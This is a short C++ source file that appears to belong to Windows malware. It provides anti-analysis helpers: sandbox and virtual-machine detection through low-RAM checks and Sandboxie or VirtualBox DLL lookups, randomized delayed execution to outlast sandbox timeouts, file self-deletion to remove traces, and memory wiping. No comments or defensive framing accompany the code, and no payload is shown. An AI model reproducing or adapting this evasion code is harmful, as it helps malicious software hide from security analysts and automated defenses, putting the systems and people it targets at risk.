#include "obfuscation.h"
#include <cstdlib>
#include <ctime>
#include <random>

void InitObfuscation() {
    std::random_device rd;
    std::seed_seq seed{ rd(), rd(), rd(), rd() };
    std::mt19937 gen(seed);
    srand(gen() ^ GetCurrentProcessId());
}

void DelayedExecution(void(*fn)(), int minMs, int maxMs) {
    int delay = minMs + rand() % (maxMs - minMs);
    Sleep(delay);
    fn();
}

bool SelfDeleteFile(const char* path) {
    HANDLE hFile = CreateFileA(path, DELETE, 0, nullptr, OPEN_EXISTING,
                                FILE_FLAG_DELETE_ON_CLOSE, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    CloseHandle(hFile);
    return true;
}

void SecureZero(void* buf, size_t len) {
    volatile char* p = (volatile char*)buf;
    for (size_t i = 0; i < len; i++)
        p[i] = 0;
}

bool IsSandboxed() {
    ULONGLONG totalPhys = 0;
    if (!GetPhysicallyInstalledSystemMemory(&totalPhys))
        totalPhys = 0;

    if (totalPhys > 0 && totalPhys < 2000000)
        return true;

    if (GetModuleHandleA("sbiedll.dll") != nullptr)
        return true;
    if (GetModuleHandleA("vboxhook.dll") != nullptr)
        return true;

    return false;
}